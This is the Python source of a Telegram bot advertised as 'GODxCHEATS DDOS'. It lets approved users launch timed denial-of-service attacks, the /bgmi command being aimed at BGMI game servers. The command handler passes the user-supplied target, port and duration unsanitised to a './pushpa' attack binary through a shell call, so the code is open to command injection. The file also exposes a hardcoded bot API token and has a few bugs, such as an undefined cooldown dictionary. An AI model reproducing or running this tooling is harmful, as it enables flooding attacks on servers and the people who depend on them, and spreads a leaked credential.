import telebot
import subprocess
import datetime
import os
from keep_alive import keep_alive

# Start the keep_alive function to keep the bot running
keep_alive()

# Bot and Admin Setup
API_TOKEN = '7774669814:AAGZaq2nGMpNZaIqVQEjOjtON6pNOKzFj9g'
ADMIN_ID = ["1662672529"]
USER_FILE = "users.txt"
LOG_FILE = "log.txt"
FREE_USER_FILE = "free_users.txt"

# Global dictionaries to manage cooldowns and expiry times
user_approval_expiry = {}

# Initialize the bot
bot = telebot.TeleBot(API_TOKEN)

# Helper function to read a file into a list
def read_file(file_path):
    try:
        with open(file_path, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Load allowed user IDs from the file
allowed_user_ids = read_file(USER_FILE)

# ------------------ Logging Functions ------------------

def log_command(user_id, target, port, time):
    try:
        user_info = bot.get_chat(user_id)
        username = f"@{user_info.username}" if user_info.username else f"UserID: {user_id}"
    except Exception as e:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target: log_entry += f" | Target: {target}"
    if port: log_entry += f" | Port: {port}"
    if time: log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# ------------------ Approval and Expiry Management ------------------

def set_approval_expiry_date(user_id, duration, time_unit):
    expiry_date = datetime.datetime.now() + {
        'hour': datetime.timedelta(hours=duration),
        'day': datetime.timedelta(days=duration),
        'week': datetime.timedelta(weeks=duration),
        'month': datetime.timedelta(days=30*duration)
    }.get(time_unit, datetime.timedelta())
    
    user_approval_expiry[user_id] = expiry_date
    return expiry_date

# ------------------ Attack and Response Functions ------------------

def start_attack_reply(message, target, port, time):
    username = message.from_user.username or message.from_user.first_name
    response = f"{username}, 🅰🆃🆃🅰🅲🅺 🅻🅰🆄🅽🅲🅷🅴🅳\n\n🆃🅰🆁🅶🅴🆃: {target}\n🅿🅾🆁🆃: {port}\n🅳🆄🆁🅰🆃🅾🅸🅽: {time} Seconds"
    bot.reply_to(message, response)

# ------------------ Command Handlers ------------------

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in ADMIN_ID:
        command = message.text.split()
        if len(command) > 2:
            user_to_add, duration_str = command[1], command[2]
            try:
                duration, time_unit = int(duration_str[:-4]), duration_str[-4:].lower()
                if duration <= 0 or time_unit not in ['hour', 'day', 'week', 'month']:
                    raise ValueError
            except ValueError:
                response = "𝚒𝚗𝚟𝚊𝚕𝚒𝚍 𝚏𝚘𝚛𝚖𝚊𝚝𝚎 𝚞𝚜𝚎 𝚝𝚘. 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return
            
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                expiry_date = set_approval_expiry_date(user_to_add, duration, time_unit)
                response = f"𝚞𝚜𝚎𝚛 {user_to_add} 𝚊𝚍𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕. 𝚊𝚌𝚌𝚎𝚜𝚜 𝚎𝚡𝚙𝚒𝚛𝚎 𝚘𝚗  {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}"
            else:
                response = "𝚞𝚜𝚎𝚛 𝚊𝚕𝚛𝚎𝚍𝚢 𝚎𝚡𝚒𝚜𝚝"
        else:
            response = "𝙴𝚡𝚊𝚖𝚙𝚕𝚎 𝚞𝚜𝚎: /add <𝚞𝚜𝚎𝚛 𝚒𝚍> <𝚍𝚞𝚛𝚊𝚝𝚘𝚒𝚗>"
    else:
        response = "❌ 𝚢𝚘𝚞 𝚊𝚛𝚎 𝚗𝚘𝚝 𝚊𝚞𝚝𝚑𝚘𝚛𝚒𝚣𝚎𝚍 𝚘𝚗𝚕𝚢 𝚊𝚍𝚖𝚒𝚗 𝚞𝚜𝚎 @𝙶𝚘𝚍𝚡𝙰𝚕𝚘𝚗𝚎𝙱𝚘𝚢."
    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in ADMIN_ID:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"𝚞𝚜𝚎𝚛 {user_to_remove} 𝚛𝚎𝚖𝚘𝚟𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢."
            else:
                response = f"𝚞𝚜𝚎𝚛 {user_to_remove} 𝚗𝚘𝚝 𝚏𝚘𝚞𝚗𝚍."
        else:
            response = "𝙴𝚡𝚊𝚖𝚙𝚕𝚎 𝚝𝚘 𝚞𝚜𝚎: /remove <𝚞𝚜𝚎𝚛 𝚒𝚍>"
    else:
        response = " ❌ 𝚢𝚘𝚞 𝚊𝚛𝚎 𝚗𝚘𝚝 𝚊𝚞𝚝𝚑𝚘𝚛𝚒𝚣𝚎𝚍 𝚘𝚗𝚕𝚢 𝚊𝚍𝚖𝚒𝚗 𝚞𝚜𝚎 @GODxAloneBOY.@RajOwner90."
    bot.reply_to(message, response)

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    if message is None or message.chat.id is None:
        return  # Handle the case where message is invalid

    user_id = str(message.chat.id)
    
    # Check if the user is allowed to use the bot
    if user_id in allowed_user_ids:
        
        # Check if the user is on cooldown and if so, if the cooldown period has passed
        if user_id not in ADMIN_ID and user_id in bgmi_cooldown:
            time_remaining = (bgmi_cooldown[user_id] - datetime.datetime.now()).seconds
            if time_remaining > 0:
                bot.reply_to(message, f"🚫 𝚢𝚘𝚞 𝚊𝚛𝚎 𝚘𝚗 𝚌𝚘𝚘𝚕𝚘𝚠𝚗. 𝚆𝚊𝚒𝚝 𝚏𝚘𝚛 {time_remaining} 𝚜𝚎𝚌𝚘𝚗𝚍𝚜 𝚊𝚗𝚍 𝚝𝚛𝚢 𝚊𝚐𝚊𝚒𝚗.")
                return

        # Set the cooldown for this user
        command = message.text.split()
        if len(command) == 4:
            target, port, time = command[1], int(command[2]), int(command[3])
            
            if time > 240:
                response = "❌ 𝙴𝚛𝚛𝚘𝚛: 𝚘𝚗𝚕𝚢 𝚢𝚘𝚞 𝚌𝚊𝚗 𝚞𝚜𝚎 𝚝𝚘 240 𝚜𝚎𝚌𝚘𝚗𝚍𝚜."
            else:
                # Record the attack and start the process
                record_command_logs(user_id, '/pushpa', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)
                subprocess.run(f"./pushpa {target} {port} {time} 900", shell=True)
                
                # Set the cooldown based on the attack time (in seconds)
                bgmi_cooldown[user_id] = datetime.datetime.now() + datetime.timedelta(seconds=time)
                
                response = f"🅱🅶🅼🅸 🅺🅸 🅲🅷🆄🅳🅰🆈🅸 🅺🅷🅰🆃🅰🅼. 𝐭𝐚𝐫𝐠𝐞𝐭: {target} 𝐩𝐨𝐫𝐭: {port} 𝐝𝐮𝐫𝐚𝐭𝐨𝐢𝐧: {time}"
            
            bot.reply_to(message, response)
        else:
            bot.reply_to(message, "𝚎𝚡𝚊𝚖𝚙𝚕𝚎 𝚝𝚘 𝚞𝚜𝚎: /bgmi <𝚝𝚊𝚛𝚐𝚎𝚝> <𝚙𝚎𝚛𝚝> <𝚍𝚞𝚛𝚊𝚝𝚘𝚒𝚗>")
    else:
        bot.reply_to(message, "❌ 𝚢𝚘𝚞 𝚊𝚛𝚎 𝚗𝚘𝚝 𝚊𝚞𝚝𝚘𝚛𝚒𝚣𝚎𝚍 𝚙𝚕𝚎𝚊𝚜𝚎 𝚌𝚘𝚗𝚝𝚊𝚌𝚝 𝚝𝚘 𝚝𝚑𝚎 𝚘𝚠𝚗𝚎𝚛 @GODxAloneBOY.@RajOwner90")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    # Welcome message when user starts the bot
    welcome_text = '''🔥 𝗛𝗘𝗟𝗟𝗢 𝗖𝗛𝗘𝗔𝗧𝗘𝗥! 🔥
    
    🌐 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 **GODxCHEATS DDOS**! 💥
    
    💻 **𝗣𝗼𝘄𝗲𝗿𝗳𝘂𝗹 𝗱𝗲𝗻𝗶𝗮𝗹 𝗼𝗳 𝘀𝗲𝗿𝘃𝗶𝗰𝗲 𝘁𝗼𝗼𝗹𝘀** 𝗮𝗿𝗲 𝗷𝘂𝘀𝘁 𝗮 𝗰𝗹𝗶𝗰𝗸 𝗮𝘄𝗮𝘆! 💣
    
    🚀 **𝗙𝗘𝗔𝗧𝗨𝗥𝗘𝗦**:
    - **/bgmi** - 𝗔𝘁𝘁𝗮𝗰𝗸 𝗟𝗮𝘂𝗻𝗰𝗵 🌪
    - **/help** - 𝗙𝗼𝗿 𝗵𝗲𝗹𝗽 𝗮𝗻𝗱 𝗮𝗱𝗺𝗶𝗻 𝗰𝗼𝗺𝗺𝗮𝗻𝗱𝘀 👑
    
    ⚠️ **𝗡𝗢𝗧𝗘**: 𝗧𝗵𝗲 𝗯𝗼𝘁 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗳𝗼𝗿 **𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗 𝗨𝗦𝗘𝗥𝗦**! 🛑

    💥 **𝗘𝗻𝗷𝗼𝘆 𝘁𝗵𝗲 𝗽𝗼𝗿𝘁𝗮𝗹 𝗼𝗳 𝗽𝗼𝘄𝗲𝗿!** ⚡'''
    
    bot.reply_to(message, welcome_text)
    
@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''🤖 𝙰𝚟𝚊𝚒𝚕𝚊𝚋𝚊𝚕 𝚌𝚘𝚖𝚖𝚊𝚗𝚍𝚜:
    /bgmi - 𝚊𝚝𝚝𝚊𝚌𝚔 𝚕𝚊𝚞𝚗𝚌𝚑 𝚌𝚘𝚖𝚖𝚊𝚗𝚍
    /add <𝚞𝚜𝚎𝚛𝚒𝚍> <𝚍𝚞𝚛𝚊𝚝𝚘𝚒𝚗> - 𝚊𝚍𝚍 𝚊 𝚗𝚎𝚠 𝚞𝚜𝚎𝚛 𝚠𝚒𝚝𝚑 𝚎𝚡𝚙𝚒𝚛𝚎
    /remove <userId> - 𝚛𝚎𝚖𝚘𝚟𝚎 𝚊 𝚞𝚜𝚎𝚛
    /admincmd - 𝚍𝚘𝚗'𝚝 𝚝𝚘𝚞𝚌𝚑  (𝚘𝚗𝚕𝚢 𝚏𝚘𝚛 𝚊𝚍𝚖𝚒𝚗 𝚌𝚘𝚖𝚖𝚊𝚗𝚍)
    '''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['admincmd'])
def admin_commands(message):
    admin_commands = '''𝚊𝚍𝚖𝚒𝚖 𝚌𝚘𝚖𝚖𝚊𝚗𝚍𝚜:
    /add <𝚞𝚜𝚎𝚛 𝚒𝚍> <𝚍𝚞𝚛𝚊𝚝𝚘𝚒𝚗> - 𝚊𝚍𝚍 𝚊 𝚗𝚎𝚠 𝚞𝚜𝚎𝚛 𝚠𝚒𝚝𝚑 𝚎𝚡𝚙𝚒𝚛𝚎
    /remove <𝚞𝚜𝚎𝚛 𝚒𝚍> - 𝚛𝚎𝚖𝚘𝚟𝚎 𝚊 𝚞𝚜𝚎𝚛
    /clearlogs - 𝚌𝚕𝚎𝚊𝚛 𝚊 𝚕𝚘𝚐𝚜 
    '''
    bot.reply_to(message, admin_commands)

# ------------------ Main Bot Loop ------------------

# Start polling the bot
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Error: {e}")
